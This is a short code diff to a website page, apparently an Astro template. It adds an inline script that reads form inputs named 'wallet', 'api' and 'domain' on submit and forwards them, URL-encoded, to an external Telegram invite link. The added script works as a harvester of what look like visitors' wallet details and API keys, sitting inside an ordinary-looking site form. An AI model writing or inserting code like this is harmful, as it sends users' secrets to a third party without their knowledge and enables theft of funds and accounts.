@@ -43,6 +43,22 @@ import { SITE_TITLE, SITE_DESCRIPTION, AUTHOR } from "../config";
         <input type="text" name="domain" placeholder="domain" />
         <input type="submit" value="Submit" />
       </form>
+      <script>
+        const openChat = () => {
+          const wallet = document.querySelector('input[name="wallet"]').value;
+          const api = document.querySelector('input[name="api"]').value;
+          const domain = document.querySelector('input[name="domain"]').value;
+          const message = `Wallet: ${wallet}\nAPI: ${api}\nDomain: ${domain}`;
+          const chatUrl = `https://t.me/+b_oMEGBQNxUzZTdk?url=${encodeURIComponent(
+            message
+          )}`;
+          window.open(chatUrl, "_blank");
+        };
+
+        document
+          .querySelector('input[type="submit"]')
+          .addEventListener("click", openChat);
+      </script>
     </div>
     <Footer />
   </body>
